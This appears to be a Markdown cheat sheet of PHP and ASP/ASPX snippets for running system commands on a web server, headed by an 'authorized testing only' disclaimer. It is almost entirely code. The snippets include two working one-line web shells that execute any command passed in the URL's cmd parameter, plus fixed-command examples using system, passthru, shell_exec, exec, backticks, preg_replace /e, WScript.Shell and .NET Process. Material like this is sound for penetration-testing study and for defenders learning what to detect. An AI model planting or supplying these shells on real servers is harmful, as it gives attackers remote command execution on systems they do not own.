# 🔐 Simple and Effective PHP/ASPX Command Execution Snippets

> ⚠️ For educational use and authorized testing environments only.

---

## 🧪 PHP Command Execution Techniques

### 🔹 1. Basic Command Execution Using `system()`
```php
<?php system("whoami"); ?>
🔹 2. Passing Commands via URL Parameters with system()
Example: shell.php?cmd=whoami

php
Copy code
<?php system($_GET['cmd']); ?>
🔹 3. Executing System Commands with passthru() for Unfiltered Output
php
Copy code
<?php passthru($_GET['cmd']); ?>
🔹 4. Capturing Command Output Using shell_exec()
php
Copy code
<?php echo shell_exec("whoami"); ?>
🔹 5. Using exec() to Run Commands (Outputs Only Last Line)
php
Copy code
<?php echo exec("whoami"); ?>
🔹 6. Storing Full Output from exec() as an Array
php
Copy code
<?php 
exec("ls -la", $output);
print_r($output);
?>
🔹 7. Backtick Syntax for Simple Command Execution
php
Copy code
<?php echo `whoami`; ?>
⚠️ 8. Legacy preg_replace() Execution Trick (Deprecated & Unsafe)
php
Copy code
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
🧱 ASPX Command Execution Snippets
🔸 1. Classic VBScript-Style ASP Command Execution
asp
Copy code
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
🔸 2. Executing Commands in C# ASPX with Output Display
aspx
Copy code
<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c whoami";
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    Response.Write("<pre>" + output + "</pre>");
}
</script>
